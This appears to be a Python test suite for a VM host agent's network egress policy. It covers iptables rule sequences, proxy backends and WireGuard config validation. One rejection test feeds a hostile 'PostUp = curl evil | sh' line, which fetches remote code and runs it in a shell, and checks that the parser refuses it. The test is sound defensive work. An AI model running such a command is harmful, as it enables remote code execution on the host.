"""Tests for the host-agent side of the egress policy (epic #235, #239).

Pins the four things the epic calls load-bearing: proxy mode installs no
veth -> iface accept and does install a drop; direct mode's rule sequence is
pinned call for call; the agent forward that carries the orchestrator's
connection to fused survives proxy mode; and a backend's config map never
reaches meta.json. Since #419 the rules key on each vm's host side veth
(fcv<slot>) rather than its tap, which now lives in the vm's namespace.

Stdlib-only, no VMs: sudo is captured, never run.
"""
import importlib.util
import json
import os
import sys
import shutil
import subprocess
import tempfile
import unittest
from pathlib import Path
from unittest import mock


_import_root = tempfile.TemporaryDirectory()
os.environ["FC_DIR"] = _import_root.name
os.environ["FC_AGENT_TOKEN"] = "test-token"
os.environ["PUBLIC_HOST"] = "127.0.0.1"
_spec = importlib.util.spec_from_file_location(
    "fc_agent", Path(__file__).parent.parent / "fc-agent.py"
)
fc_agent = importlib.util.module_from_spec(_spec)
assert _spec.loader is not None
# a fresh agentlib per load, so each agent copy keeps the paths it was
# configured with instead of sharing the last one loaded.
sys.modules.pop("agentlib", None)
_spec.loader.exec_module(fc_agent)


def capture_sudo(present=()):
    """Returns (calls, fake). fake records every argv. A -C check or -D delete
    answers 0 (rule present) only for argv suffixes listed in `present`, and
    only once each, so a purge loop sees one stale rule and then nothing."""
    calls = []
    remaining = [list(p) for p in present]

    def fake(cmd, check=True):
        calls.append(list(cmd))
        probing = "-C" in cmd or "-D" in cmd
        for rule in remaining:
            if probing and cmd[-len(rule):] == rule:
                remaining.remove(rule)
                return subprocess.CompletedProcess(cmd, 0)
        return subprocess.CompletedProcess(cmd, 1)

    return calls, fake


# every iptables call waits for the xtables lock (#79), so a parallel create
# cannot make one fail.
IPT = ["iptables", "-w", "30"]

# The call sequence for a direct vm in slot 3, verbatim: its namespace, the
# veth into it, the nat at the veth, then the host rules the tap used to
# have, keyed on the veth. If this changes, every host's direct vms change.
IN_NS = ["ip", "netns", "exec", "fcns3"]
DIRECT_SEQUENCE = [
    ["ip", "netns", "del", "fcns3"],
    ["ip", "link", "del", "fcv3"],
    ["ip", "netns", "add", "fcns3"],
    ["ip", "link", "add", "fcv3", "type", "veth", "peer", "name", "veth0", "netns", "fcns3"],
    ["ip", "addr", "add", "10.208.0.3", "peer", "10.209.0.3", "dev", "fcv3"],
    ["ip", "link", "set", "fcv3", "up"],
    IN_NS + ["ip", "link", "set", "lo", "up"],
    IN_NS + ["ip", "addr", "add", "10.209.0.3", "peer", "10.208.0.3", "dev", "veth0"],
    IN_NS + ["ip", "link", "set", "veth0", "up"],
    IN_NS + ["ip", "route", "add", "default", "via", "10.208.0.3"],
    IN_NS + ["ip", "tuntap", "add", "tap0", "mode", "tap"],
    IN_NS + ["ip", "addr", "add", "172.16.0.1/30", "dev", "tap0"],
    IN_NS + ["ip", "link", "set", "tap0", "up"],
    IN_NS + ["sysctl", "-w", "net.ipv4.ip_forward=1"],
    IN_NS + IPT + ["-t", "nat", "-A", "PREROUTING", "-i", "veth0", "-d", "10.209.0.3", "-j", "DNAT", "--to-destination", "172.16.0.2"],
    IN_NS + IPT + ["-t", "nat", "-A", "POSTROUTING", "-o", "veth0", "-s", "172.16.0.2", "-j", "SNAT", "--to-source", "10.209.0.3"],
    IN_NS + IPT + ["-t", "nat", "-A", "PREROUTING", "-i", "tap0", "-d", "172.16.0.1", "-p", "tcp", "-j", "DNAT", "--to-destination", "10.208.0.3"],
    ["sysctl", "-w", "net.ipv4.ip_forward=1"],
    # whatever an earlier holder of the slot left on the veth goes first.
    IPT + ["-D", "FORWARD", "-i", "fcv3", "-o", "eth0", "-j", "ACCEPT"],
    IPT + ["-D", "FORWARD", "-i", "fcv3", "-o", "eth0", "-j", "DROP"],
    IPT + ["-D", "FORWARD", "-i", "fcv3", "-o", "eth0", "-m", "state", "--state", "RELATED,ESTABLISHED", "-j", "ACCEPT"],
    IPT + ["-D", "FORWARD", "-i", "eth0", "-o", "fcv3", "-m", "state", "--state", "RELATED,ESTABLISHED", "-j", "ACCEPT"],
    # and any allowlist chain it left, both names, jump first.
    IPT + ["-D", "FORWARD", "-i", "fcv3", "-o", "eth0", "-j", "FUSE-EG-fcv3-A"],
    IPT + ["-F", "FUSE-EG-fcv3-A"],
    IPT + ["-X", "FUSE-EG-fcv3-A"],
    IPT + ["-D", "FORWARD", "-i", "fcv3", "-o", "eth0", "-j", "FUSE-EG-fcv3-B"],
    IPT + ["-F", "FUSE-EG-fcv3-B"],
    IPT + ["-X", "FUSE-EG-fcv3-B"],
    IPT + ["-t", "nat", "-C", "POSTROUTING", "-o", "eth0", "-j", "MASQUERADE"],
    IPT + ["-t", "nat", "-A", "POSTROUTING", "-o", "eth0", "-j", "MASQUERADE"],
    IPT + ["-C", "FORWARD", "-i", "fcv3", "-o", "eth0", "-j", "ACCEPT"],
    IPT + ["-I", "FORWARD", "-i", "fcv3", "-o", "eth0", "-j", "ACCEPT"],
    IPT + ["-C", "FORWARD", "-i", "eth0", "-o", "fcv3", "-m", "state", "--state", "RELATED,ESTABLISHED", "-j", "ACCEPT"],
    IPT + ["-I", "FORWARD", "-i", "eth0", "-o", "fcv3", "-m", "state", "--state", "RELATED,ESTABLISHED", "-j", "ACCEPT"],
]

OUTBOUND_ACCEPT = IPT + ["-I", "FORWARD", "-i", "fcv3", "-o", "eth0", "-j", "ACCEPT"]
OUTBOUND_DROP = IPT + ["-I", "FORWARD", "-i", "fcv3", "-o", "eth0", "-j", "DROP"]
OUTBOUND_REPLY = IPT + ["-I", "FORWARD", "-i", "fcv3", "-o", "eth0", "-m", "state", "--state", "RELATED,ESTABLISHED", "-j", "ACCEPT"]
PURGE_ACCEPT = IPT + ["-D", "FORWARD", "-i", "fcv3", "-o", "eth0", "-j", "ACCEPT"]
PURGE_DROP = IPT + ["-D", "FORWARD", "-i", "fcv3", "-o", "eth0", "-j", "DROP"]
RETURN_ACCEPT = DIRECT_SEQUENCE[-1]
ADDRS = ("fcv3", "10.208.0.3", "10.209.0.3")


class SetupTapTest(unittest.TestCase):
    def test_direct_mode_sequence_is_pinned(self):
        calls, fake = capture_sudo()
        with mock.patch.object(fc_agent, "sudo", side_effect=fake):
            result = fc_agent.setup_tap(3, "eth0")
        self.assertEqual(result, ADDRS)
        self.assertEqual(calls, DIRECT_SEQUENCE)

    def test_explicit_direct_equals_the_default(self):
        calls, fake = capture_sudo()
        with mock.patch.object(fc_agent, "sudo", side_effect=fake):
            fc_agent.setup_tap(3, "eth0", "direct")
        self.assertEqual(calls, DIRECT_SEQUENCE)

    def test_proxy_mode_installs_a_drop_and_no_accept(self):
        calls, fake = capture_sudo()
        with mock.patch.object(fc_agent, "sudo", side_effect=fake):
            result = fc_agent.setup_tap(3, "eth0", "proxy")
        self.assertEqual(result, ADDRS)
        self.assertIn(OUTBOUND_DROP, calls)
        self.assertNotIn(OUTBOUND_ACCEPT, calls)
        # the drop must not be a bare omission: with no default-deny on the
        # chain (issue #208) an absent accept enforces nothing.
        self.assertTrue(any(c[3:5] == ["-I", "FORWARD"] and c[-1] == "DROP" for c in calls))

    def test_proxy_mode_keeps_the_return_leg_above_the_drop(self):
        # all are -I'd, so a later insert sits higher in the chain. both
        # RELATED,ESTABLISHED accepts must be inserted after the drop: the
        # outbound one carries the replies of the orchestrator's dnat'd
        # connection to fused, which leave by the same veth -> iface path the
        # drop covers.
        calls, fake = capture_sudo()
        with mock.patch.object(fc_agent, "sudo", side_effect=fake):
            fc_agent.setup_tap(3, "eth0", "proxy")
        self.assertLess(calls.index(OUTBOUND_DROP), calls.index(OUTBOUND_REPLY))
        self.assertLess(calls.index(OUTBOUND_DROP), calls.index(RETURN_ACCEPT))

    def test_direct_mode_needs_no_reply_accept(self):
        calls, fake = capture_sudo()
        with mock.patch.object(fc_agent, "sudo", side_effect=fake):
            fc_agent.setup_tap(3, "eth0")
        self.assertNotIn(OUTBOUND_REPLY, calls)

    def test_proxy_mode_purges_a_stale_accept_first(self):
        # iptables rules outlive the device they name. a direct vm that held
        # slot 3 earlier left its accept; it must go before the drop lands.
        calls, fake = capture_sudo(present=[PURGE_ACCEPT[1:]])
        with mock.patch.object(fc_agent, "sudo", side_effect=fake):
            fc_agent.setup_tap(3, "eth0", "proxy")
        purges = [i for i, c in enumerate(calls) if c == PURGE_ACCEPT]
        self.assertEqual(len(purges), 2, "one delete that hit, one that found nothing")
        self.assertLess(purges[-1], calls.index(OUTBOUND_DROP))

    def test_proxy_mode_shares_everything_but_the_outbound_leg_with_direct(self):
        calls, fake = capture_sudo()
        with mock.patch.object(fc_agent, "sudo", side_effect=fake):
            fc_agent.setup_tap(3, "eth0", "proxy")
        outbound = {"ACCEPT", "DROP"}
        stripped = [c for c in calls if not (c[:3] == IPT and c[3] in ("-C", "-I", "-D") and c[4] == "FORWARD" and c[6] == "fcv3" and c[-1] in outbound)]
        expected = [c for c in DIRECT_SEQUENCE if not (c[:3] == IPT and c[4] == "FORWARD" and c[6] == "fcv3" and c[-1] in outbound)]
        self.assertEqual(stripped, expected)


class AgentForwardTest(unittest.TestCase):
    def test_agent_forward_never_touches_the_tap_outbound_rule(self):
        # the control plane reaches fused through PREROUTING dnat plus a
        # destination-matched FORWARD accept; none of it is keyed on the tap
        # as an input interface, so proxy mode's drop cannot cut it off.
        calls, fake = capture_sudo()
        with mock.patch.object(fc_agent.agentlib, "sudo", side_effect=fake):
            fc_agent.add_agent_forward(19553, "10.200.3.2", "eth0")
        self.assertEqual(calls, [
            IPT + ["-t", "nat", "-I", "PREROUTING", "-i", "eth0", "-p", "tcp", "--dport", "19553", "-j", "DNAT", "--to-destination", "10.200.3.2:9550"],
            IPT + ["-t", "nat", "-I", "OUTPUT", "-o", "lo", "-p", "tcp", "--dport", "19553", "-j", "DNAT", "--to-destination", "10.200.3.2:9550"],
            IPT + ["-I", "FORWARD", "-p", "tcp", "-d", "10.200.3.2", "--dport", "9550", "-j", "ACCEPT"],
            IPT + ["-I", "INPUT", "-p", "tcp", "--dport", "19553", "-j", "ACCEPT"],
        ])
        for c in calls:
            self.assertNotIn("fcv3", c)


class EgressModeTest(unittest.TestCase):
    def test_absent_is_direct(self):
        self.assertEqual(fc_agent.parse_egress_mode({}), "direct")
        self.assertEqual(fc_agent.parse_egress_mode({"egress": None}), "direct")
        self.assertEqual(fc_agent.parse_egress_mode({"egress": {}}), "direct")

    def test_proxy(self):
        self.assertEqual(fc_agent.parse_egress_mode({"egress": {"mode": "proxy"}}), "proxy")

    def test_unknown_mode_is_a_400_not_a_fallback(self):
        with self.assertRaises(fc_agent.HTTPError) as caught:
            fc_agent.parse_egress_mode({"egress": {"mode": "tunnel"}})
        self.assertEqual(caught.exception.code, 400)
        self.assertIn("tunnel", caught.exception.msg)

    def test_create_vm_rejects_a_bad_mode_before_allocating_anything(self):
        with mock.patch.object(fc_agent, "sudo", side_effect=AssertionError("sudo must not run")), \
             mock.patch.object(fc_agent, "pick_index", side_effect=AssertionError("no index must be picked")):
            with self.assertRaises(fc_agent.HTTPError) as caught:
                fc_agent.create_vm({"name": "x", "egress": {"mode": "tunnel"}})
        self.assertEqual(caught.exception.code, 400)


class GuestNetworkFixupTest(unittest.TestCase):
    def test_direct_is_the_pre_egress_command_verbatim(self):
        self.assertEqual(
            fc_agent.guest_network_fixup("10.200.3.1", "direct"),
            "ip route show default | grep -q . || ip route add default via "
            "10.200.3.1; grep -q 1.1.1.1 /etc/resolv.conf 2>/dev/null || "
            "echo nameserver 1.1.1.1 > /etc/resolv.conf",
        )

    def test_proxy_points_the_resolver_at_a_stub(self):
        cmd = fc_agent.guest_network_fixup("10.200.3.1", "proxy")
        self.assertIn("ip route add default via 10.200.3.1", cmd)
        self.assertIn("nameserver 127.0.0.1", cmd)
        self.assertNotIn("1.1.1.1", cmd)


class EgressWireTest(unittest.TestCase):
    def setUp(self):
        self.tmp = tempfile.TemporaryDirectory()
        self.addCleanup(self.tmp.cleanup)
        self.vms = Path(self.tmp.name) / "vms"
        self.vms.mkdir()
        for mod in (fc_agent, fc_agent.agentlib):
            patcher = mock.patch.object(mod, "VMS_DIR", self.vms)
            patcher.start()
            self.addCleanup(patcher.stop)
        self.provisioned = []
        self.destroyed = []

        def provision(meta, body):
            self.provisioned.append((meta["vm_id"], body))
            return {"url": "socks5h://10.200.3.1:1080", "protocol": "socks5"}

        def destroy(meta):
            self.destroyed.append(meta["vm_id"])

        providers = mock.patch.dict(fc_agent.EGRESS_PROVIDERS, {"fake": (provision, destroy)}, clear=True)
        providers.start()
        self.addCleanup(providers.stop)

    def write_meta(self, vm_id, **extra):
        (self.vms / vm_id).mkdir()
        meta = {"vm_id": vm_id, "host_ip": "10.200.3.1", "guest_ip": "10.200.3.2", "tap": "fcv3", "index": 3}
        meta.update(extra)
        fc_agent.save_meta(meta)
        return meta

    def meta_text(self, vm_id):
        return (self.vms / vm_id / "meta.json").read_text()

    def body(self, **overrides):
        b = {"provider": "fake", "protocol": "socks5", "listen_ip": "10.200.3.1",
             "guest_ip": "10.200.3.2", "config": {"token": "SECRET-warp-license"}}
        b.update(overrides)
        return b

    def test_config_never_reaches_meta_json_or_the_response(self):
        self.write_meta("vm-a", egress_mode="proxy")
        rec = fc_agent.provision_egress("vm-a", self.body())
        self.assertEqual(rec, {"provider": "fake", "protocol": "socks5", "url": "socks5h://10.200.3.1:1080"})
        text = self.meta_text("vm-a")
        self.assertNotIn("SECRET-warp-license", text)
        self.assertNotIn("config", text)
        self.assertEqual(json.loads(text)["egress"], rec)
        # the backend did receive it; that is the only place it may go.
        self.assertEqual(self.provisioned[0][1]["config"], {"token": "SECRET-warp-license"})

    def test_unknown_provider_fails_rather_than_being_ignored(self):
        self.write_meta("vm-a", egress_mode="proxy")
        with self.assertRaises(fc_agent.HTTPError) as caught:
            fc_agent.provision_egress("vm-a", self.body(provider="warp"))
        self.assertEqual(caught.exception.code, 400)
        self.assertIn("'warp'", caught.exception.msg)
        self.assertIn("fake", caught.exception.msg)
        self.assertNotIn("egress", json.loads(self.meta_text("vm-a")))

    def test_direct_vm_cannot_take_a_backend(self):
        self.write_meta("vm-a", egress_mode="direct")
        with self.assertRaises(fc_agent.HTTPError) as caught:
            fc_agent.provision_egress("vm-a", self.body())
        self.assertEqual(caught.exception.code, 409)
        self.assertEqual(self.provisioned, [])

    def test_double_provision_is_a_409(self):
        self.write_meta("vm-a", egress_mode="proxy")
        fc_agent.provision_egress("vm-a", self.body())
        with self.assertRaises(fc_agent.HTTPError) as caught:
            fc_agent.provision_egress("vm-a", self.body())
        self.assertEqual(caught.exception.code, 409)
        self.assertEqual(len(self.provisioned), 1)

    def test_listen_ip_must_be_the_tap_address(self):
        self.write_meta("vm-a", egress_mode="proxy")
        with self.assertRaises(fc_agent.HTTPError) as caught:
            fc_agent.provision_egress("vm-a", self.body(listen_ip="0.0.0.0"))
        self.assertEqual(caught.exception.code, 400)
        self.assertEqual(self.provisioned, [])

    def test_unknown_vm_is_a_404(self):
        with self.assertRaises(fc_agent.HTTPError) as caught:
            fc_agent.provision_egress("vm-missing", self.body())
        self.assertEqual(caught.exception.code, 404)

    def test_release_is_idempotent_and_clears_the_record(self):
        self.write_meta("vm-a", egress_mode="proxy")
        fc_agent.provision_egress("vm-a", self.body())
        meta = fc_agent.load_meta("vm-a")
        fc_agent.release_egress(meta)
        self.assertEqual(self.destroyed, ["vm-a"])
        self.assertNotIn("egress", json.loads(self.meta_text("vm-a")))
        fc_agent.release_egress(fc_agent.load_meta("vm-a"))
        self.assertEqual(self.destroyed, ["vm-a"], "second release must not call the backend again")
        # released, the vm can be provisioned again.
        fc_agent.provision_egress("vm-a", self.body())
        self.assertEqual(len(self.provisioned), 2)

    def test_release_survives_a_failing_or_missing_backend(self):
        self.write_meta("vm-a", egress_mode="proxy", egress={"provider": "gone", "protocol": "socks5", "url": "x"})
        fc_agent.release_egress(fc_agent.load_meta("vm-a"))
        self.assertNotIn("egress", json.loads(self.meta_text("vm-a")))

        def boom(meta):
            raise RuntimeError("backend exploded")

        with mock.patch.dict(fc_agent.EGRESS_PROVIDERS, {"fake": (lambda m, b: {"url": "x"}, boom)}):
            fc_agent.provision_egress("vm-a", self.body())
            fc_agent.release_egress(fc_agent.load_meta("vm-a"))
        self.assertNotIn("egress", json.loads(self.meta_text("vm-a")))


class DestroyVMTest(unittest.TestCase):
    def setUp(self):
        self.tmp = tempfile.TemporaryDirectory()
        self.addCleanup(self.tmp.cleanup)
        self.vms = Path(self.tmp.name) / "vms"
        self.vms.mkdir()
        for target, value in (("VMS_DIR", self.vms), ("SSH_CONTROL_DIR", Path(self.tmp.name))):
            for mod in (fc_agent, fc_agent.agentlib):
                p = mock.patch.object(mod, target, value)
                p.start()
                self.addCleanup(p.stop)
        self.destroyed = []
        providers = mock.patch.dict(fc_agent.EGRESS_PROVIDERS, {"fake": (None, self.destroyed.append)}, clear=True)
        providers.start()
        self.addCleanup(providers.stop)

    def write_meta(self, **extra):
        (self.vms / "vm-a").mkdir()
        meta = {"vm_id": "vm-a", "host_ip": "10.200.3.1", "guest_ip": "10.200.3.2", "tap": "fcv3", "index": 3}
        meta.update(extra)
        fc_agent.save_meta(meta)

    def destroy(self):
        calls, fake = capture_sudo()
        with mock.patch.object(fc_agent, "sudo", side_effect=fake), \
             mock.patch.object(fc_agent.agentlib, "sudo", side_effect=fake), \
             mock.patch.object(fc_agent, "stop_firecracker"), \
             mock.patch.object(fc_agent, "host_iface", return_value="eth0"), \
             mock.patch.object(fc_agent.agentlib, "host_iface", return_value="eth0"):
            fc_agent.destroy_vm("vm-a")
        return calls

    def test_proxy_vm_releases_its_backend_and_its_drop(self):
        self.write_meta(egress_mode="proxy", egress={"provider": "fake", "protocol": "socks5", "url": "x"})
        calls = self.destroy()
        self.assertEqual([m["vm_id"] for m in self.destroyed], ["vm-a"])
        self.assertIn(PURGE_DROP, calls)
        self.assertLess(calls.index(PURGE_DROP), calls.index(["ip", "link", "del", "fcv3"]))

    def test_every_mode_purges_every_veth_rule_then_the_namespace(self):
        # #211: whatever the mode, nothing keyed on the veth may outlive the
        # vm, or it decides the egress of the next vm on the slot. a vm from
        # before egress (no egress_mode) and one from before namespaces (its
        # tap had the veth's name) take the same path.
        purges = [PURGE_ACCEPT, PURGE_DROP, IPT + ["-D"] + OUTBOUND_REPLY[4:],
                  IPT + ["-D"] + RETURN_ACCEPT[4:]]
        for extra in ({"egress_mode": "direct"}, {"egress_mode": "proxy"}, {}):
            with self.subTest(extra=extra):
                shutil.rmtree(self.vms / "vm-a", ignore_errors=True)
                self.write_meta(**extra)
                calls = self.destroy()
                for p in purges:
                    self.assertIn(p, calls)
                    self.assertLess(calls.index(p), calls.index(["ip", "netns", "del", "fcns3"]))
                self.assertIn(["ip", "link", "del", "fcv3"], calls)
        self.assertEqual(self.destroyed, [])


class WarpBackendTest(unittest.TestCase):
    """the cloudflare-warp backend: one warp per host, refcounted, and the
    credential travels to the script on stdin and nowhere else."""

    SECRET = "svc-secret-0123456789abcdef"

    def setUp(self):
        self.tmp = tempfile.TemporaryDirectory()
        self.addCleanup(self.tmp.cleanup)
        refs = Path(self.tmp.name) / "warp-refs"
        p = mock.patch.object(fc_agent, "WARP_REFS_DIR", refs)
        p.start()
        self.addCleanup(p.stop)
        self.runs = []
        self.sudos = []

        def fake_run(cmd, check=True, input_bytes=None):
            self.runs.append((list(cmd), input_bytes))
            return subprocess.CompletedProcess(cmd, 0, stdout=b"", stderr=b"")

        def fake_sudo(cmd, check=True):
            self.sudos.append(list(cmd))
            return subprocess.CompletedProcess(cmd, 0)

        for name, fake in (("run", fake_run), ("sudo", fake_sudo)):
            p = mock.patch.object(fc_agent, name, side_effect=fake)
            p.start()
            self.addCleanup(p.stop)

    def meta(self, vm_id, idx=3):
        return {"vm_id": vm_id, "tap": f"fcv{idx}", "host_ip": f"10.200.{idx}.1", "guest_ip": f"10.200.{idx}.2"}

    def body(self, **overrides):
        b = {"provider": "cloudflare-warp", "protocol": "socks5", "listen_ip": "10.200.3.1",
             "config": {"WARP_ORG": "acme", "WARP_CLIENT_ID": "client-0123456789", "WARP_CLIENT_SECRET": self.SECRET}}
        b.update(overrides)
        return b

    def script_calls(self, verb):
        return [c for c in self.runs if c[0][-1] == verb] + [(c, None) for c in self.sudos if verb in c]

    def test_first_vm_brings_warp_up_with_the_credential_on_stdin_only(self):
        ep = fc_agent.warp_provision(self.meta("vm-a"), self.body())
        self.assertEqual(ep, {"url": "socks5h://10.200.3.1:1080", "protocol": "socks5"})
        ups = [c for c in self.runs if "up" in c[0]]
        self.assertEqual(len(ups), 1)
        argv, stdin = ups[0]
        self.assertNotIn(self.SECRET, " ".join(argv))
        self.assertIn(f"WARP_CLIENT_SECRET={self.SECRET}\n", stdin.decode())
        self.assertIn("WARP_ORG=acme\n", stdin.decode())
        # no sudo call ever carries it either.
        for c in self.sudos:
            self.assertNotIn(self.SECRET, " ".join(c))
        self.assertIn(["bash", str(fc_agent.WARP_SCRIPT), "attach", "fcv3", "10.200.3.1", "1080"], self.sudos)
        self.assertEqual(fc_agent.warp_refs(), {"vm-a"})

    def test_second_vm_shares_the_running_warp(self):
        fc_agent.warp_provision(self.meta("vm-a", 3), self.body())
        self.runs.clear(); self.sudos.clear()
        ep = fc_agent.warp_provision(self.meta("vm-b", 4), self.body(protocol="http"))
        self.assertEqual(ep, {"url": "http://10.200.4.1:1080", "protocol": "http"})
        self.assertEqual([c for c in self.runs if "up" in c[0]], [], "warp brought up twice")
        self.assertIn(["bash", str(fc_agent.WARP_SCRIPT), "attach", "fcv4", "10.200.4.1", "1080"], self.sudos)
        self.assertEqual(fc_agent.warp_refs(), {"vm-a", "vm-b"})

    def test_last_vm_out_tears_warp_down(self):
        fc_agent.warp_provision(self.meta("vm-a", 3), self.body())
        fc_agent.warp_provision(self.meta("vm-b", 4), self.body())
        self.sudos.clear()
        fc_agent.warp_destroy(self.meta("vm-a", 3))
        self.assertIn(["bash", str(fc_agent.WARP_SCRIPT), "detach", "fcv3", "10.200.3.1", "1080"], self.sudos)
        self.assertNotIn(["bash", str(fc_agent.WARP_SCRIPT), "down"], self.sudos, "torn down with a vm still attached")
        self.sudos.clear()
        fc_agent.warp_destroy(self.meta("vm-b", 4))
        self.assertIn(["bash", str(fc_agent.WARP_SCRIPT), "down"], self.sudos)
        self.assertEqual(fc_agent.warp_refs(), set())
        # a second destroy is a no-op that still runs the idempotent detach.
        fc_agent.warp_destroy(self.meta("vm-b", 4))

    def test_a_backend_that_does_not_come_up_is_a_502_without_the_credential(self):
        def failing_run(cmd, check=True, input_bytes=None):
            return subprocess.CompletedProcess(cmd, 1, stdout=b"", stderr=f"[warp] refused: bad token {self.SECRET}\n".encode())

        with mock.patch.object(fc_agent, "run", side_effect=failing_run):
            with self.assertRaises(fc_agent.HTTPError) as caught:
                fc_agent.warp_provision(self.meta("vm-a"), self.body())
        self.assertEqual(caught.exception.code, 502)
        self.assertNotIn(self.SECRET, caught.exception.msg)
        self.assertIn("[REDACTED]", caught.exception.msg)
        self.assertEqual(fc_agent.warp_refs(), set(), "a failed provision must hold no ref")

    def test_rejects_bad_protocol_missing_credential_and_unknown_keys(self):
        for body, want in (
            (self.body(protocol="udp"), 400),
            (self.body(config={"WARP_ORG": "acme"}), 400),
            (self.body(config={"WARP_LICENSE": "k", "EVIL": "x"}), 400),
        ):
            with self.assertRaises(fc_agent.HTTPError) as caught:
                fc_agent.warp_provision(self.meta("vm-a"), body)
            self.assertEqual(caught.exception.code, want)
        self.assertEqual(self.runs, [], "a refused request must not touch the host")

    def test_registered_under_its_name(self):
        self.assertIn("cloudflare-warp", fc_agent.EGRESS_PROVIDERS)


WG_PRIVATE = "yAnz5TF+lXXJte14tji3zlMNq+hd2rYUIgJBgB3fBmk="
WG_CONF = f"""# a comment
[Interface]
PrivateKey = {WG_PRIVATE}
Address = 10.64.0.2/32
DNS = 10.64.0.1

[Peer]
PublicKey = xTIBA5rboUvnH4htodjb6e697QjLERt1NAB4mZqp8Dg=
Endpoint = 203.0.113.7:51820
AllowedIPs = 0.0.0.0/0
"""


def wg_blob(conf=WG_CONF):
    import base64
    return base64.b64encode(conf.encode()).decode()


class WireGuardConfTest(unittest.TestCase):
    """the config allowlist: what wireproxy would run is exactly what was
    validated, and nothing that executes or leaks is let through."""

    def test_accepts_a_standard_config(self):
        sections = fc_agent.wg_parse_conf(WG_CONF)
        self.assertEqual([s[0] for s in sections], ["interface", "peer"])
        self.assertIn(("DNS", "10.64.0.1"), sections[0][1])

    def test_rejects_what_wg_quick_would_execute_or_wireproxy_would_expand(self):
        for extra, why in (
            ("PostUp = curl evil | sh", "PostUp"),
            ("Table = off", "Table"),
            ("SaveConfig = true", "SaveConfig"),
        ):
            conf = WG_CONF.replace("DNS = 10.64.0.1", f"DNS = 10.64.0.1\n{extra}")
            with self.assertRaises(fc_agent.HTTPError) as caught:
                fc_agent.wg_parse_conf(conf)
            self.assertEqual(caught.exception.code, 400)
            self.assertIn(why, caught.exception.msg)
        env_ref = WG_CONF.replace(WG_PRIVATE, "$HOME")
        with self.assertRaises(fc_agent.HTTPError):
            fc_agent.wg_parse_conf(env_ref)

    def test_requires_dns_so_lookups_cannot_leave_outside_the_tunnel(self):
        with self.assertRaises(fc_agent.HTTPError) as caught:
            fc_agent.wg_parse_conf(WG_CONF.replace("DNS = 10.64.0.1\n", ""))
        self.assertIn("DNS", caught.exception.msg)

    def test_rejects_structure_errors_without_echoing_values(self):
        for conf in (
            "[Interface]\nPrivateKey = x\n",                                    # no peer
            WG_CONF + "\n[Interface]\nPrivateKey = y\nAddress = a\nDNS = d\n",  # two interfaces
            WG_CONF.replace("[Peer]", "[Proxy]"),                                # unknown section
            WG_CONF.replace("Endpoint = 203.0.113.7:51820", "Endpoint"),         # not key = value
            WG_CONF.replace("Address = 10.64.0.2/32", f"PrivateKey = {WG_PRIVATE}"),  # duplicate key
        ):
            with self.assertRaises(fc_agent.HTTPError) as caught:
                fc_agent.wg_parse_conf(conf)
            self.assertEqual(caught.exception.code, 400)
            self.assertNotIn(WG_PRIVATE, caught.exception.msg)

    def test_fingerprint_ignores_comments_whitespace_and_key_case(self):
        a = fc_agent.wg_fingerprint(fc_agent.wg_parse_conf(WG_CONF))
        b = fc_agent.wg_fingerprint(fc_agent.wg_parse_conf(
            WG_CONF.replace("# a comment\n", "").replace("PrivateKey =", "privatekey=").replace("\n\n", "\n\n\n")))
        self.assertEqual(a, b)
        other = fc_agent.wg_fingerprint(fc_agent.wg_parse_conf(WG_CONF.replace("10.64.0.2/32", "10.64.0.3/32")))
        self.assertNotEqual(a, other)

    def test_render_adds_keepalive_and_both_listeners(self):
        out = fc_agent.wg_render(fc_agent.wg_parse_conf(WG_CONF), 7)
        self.assertIn("PersistentKeepalive = 25", out)
        self.assertIn("[Socks5]\nBindAddress = 10.202.7.2:1080", out)
        self.assertIn("[http]\nBindAddress = 10.202.7.2:1081", out)
        # an explicit keepalive is kept, not doubled.
        conf = WG_CONF.replace("AllowedIPs = 0.0.0.0/0", "AllowedIPs = 0.0.0.0/0\nPersistentKeepalive = 10")
        out = fc_agent.wg_render(fc_agent.wg_parse_conf(conf), 7)
        self.assertEqual(out.count("PersistentKeepalive"), 1)

    def test_endpoint_hostnames_resolve_on_the_host(self):
        infos = [(2, 2, 17, "", ("198.51.100.9", 51820))]
        with mock.patch.object(fc_agent.socket, "getaddrinfo", return_value=infos):
            self.assertEqual(fc_agent.wg_resolve_endpoint("vpn.example.com:51820"), "198.51.100.9:51820")
        self.assertEqual(fc_agent.wg_resolve_endpoint("[2001:db8::1]:51820"), "[2001:db8::1]:51820")
        with self.assertRaises(fc_agent.HTTPError):
            fc_agent.wg_resolve_endpoint("no-port")


class WireGuardBackendTest(unittest.TestCase):
    """the wireguard backend: one bridge per config, refcounted, and the
    config travels to the script on stdin and nowhere else."""

    def setUp(self):
        self.tmp = tempfile.TemporaryDirectory()
        self.addCleanup(self.tmp.cleanup)
        p = mock.patch.object(fc_agent, "WG_DIR", Path(self.tmp.name) / "wireguard")
        p.start()
        self.addCleanup(p.stop)
        self.runs = []
        self.sudos = []

        def fake_run(cmd, check=True, input_bytes=None):
            self.runs.append((list(cmd), input_bytes))
            return subprocess.CompletedProcess(cmd, 0, stdout=b"", stderr=b"")

        def fake_sudo(cmd, check=True):
            self.sudos.append(list(cmd))
            return subprocess.CompletedProcess(cmd, 0)

        for name, fake in (("run", fake_run), ("sudo", fake_sudo)):
            p = mock.patch.object(fc_agent, name, side_effect=fake)
            p.start()
            self.addCleanup(p.stop)

    def meta(self, vm_id, idx=3):
        return {"vm_id": vm_id, "tap": f"fcv{idx}", "host_ip": f"10.200.{idx}.1", "guest_ip": f"10.200.{idx}.2"}

    def body(self, conf=WG_CONF, **overrides):
        b = {"provider": "wireguard", "protocol": "socks5", "listen_ip": "10.200.3.1", "config": {"WG_CONF": wg_blob(conf)}}
        b.update(overrides)
        return b

    def verb(self, name):
        return [c for c in self.sudos if len(c) > 2 and c[2] == name]

    def ups(self):
        return [c for c in self.runs if "up" in c[0]]

    def test_first_vm_brings_a_bridge_up_with_the_config_on_stdin_only(self):
        ep = fc_agent.wg_provision(self.meta("vm-a"), self.body())
        self.assertEqual(ep, {"url": "socks5h://10.200.3.1:1080", "protocol": "socks5"})
        self.assertEqual(len(self.ups()), 1)
        argv, stdin = self.ups()[0]
        fp, slot = argv[-2], argv[-1]
        self.assertEqual(slot, "0")
        self.assertRegex(fp, r"^[0-9a-f]{12}$")
        self.assertNotIn(WG_PRIVATE, " ".join(argv))
        self.assertIn(f"PrivateKey = {WG_PRIVATE}", stdin.decode())
        for c in self.sudos:
            self.assertNotIn(WG_PRIVATE, " ".join(c))
